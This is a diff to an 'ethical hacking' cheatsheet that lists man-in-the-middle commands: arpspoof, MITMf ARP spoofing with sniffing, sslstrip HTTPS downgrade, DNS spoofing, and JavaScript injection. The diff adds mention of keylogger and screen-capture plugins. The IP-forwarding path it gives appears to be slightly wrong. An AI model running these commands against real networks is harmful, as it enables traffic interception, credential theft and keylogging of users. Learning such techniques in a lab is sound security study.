@@ -14,9 +14,10 @@ This is a cheatsheet for commands and tools commonly used for ethical hacking.
 MITM:
 7) ARP Spoof       : a) arpspoof -i ath0 -t 10.0.2.9 10.0.2.1 b) arpspoof -i ath0 -t 10.0.2.1 10.0.2.9 c) echo "1" > /proc/sys/net/ipv4/ip_forwarding
 
-8) MITMF           : a) mitmf --arp --spoof --gateway 10.0.2.1 --target 10.0.2.9 -i ath0   --- this command is arp spoof + sniffing
+8) MITMF           : a) mitmf --arp --spoof --gateway 10.0.2.1 --target 10.0.2.9 -i ath0   --- this command is arp spoof + sniffing. Contains many other plugins such as --screen, --jskeylogger
 
 9) HTTPS           : Use sslstrip to downgrade https to http. MITMF commands deploy it.
 
 10) DNS Spoof      : a) Add dns entry to /etc/mitmf/mitmf.conf b) mitmf --arp --spoof --gateway 10.0.2.1 --target 10.0.2.9 -i ath0 --dns 
-       
+ 
+11) Inject code    : a) Use mitmf with --inject --js-payload 'alert("test");'
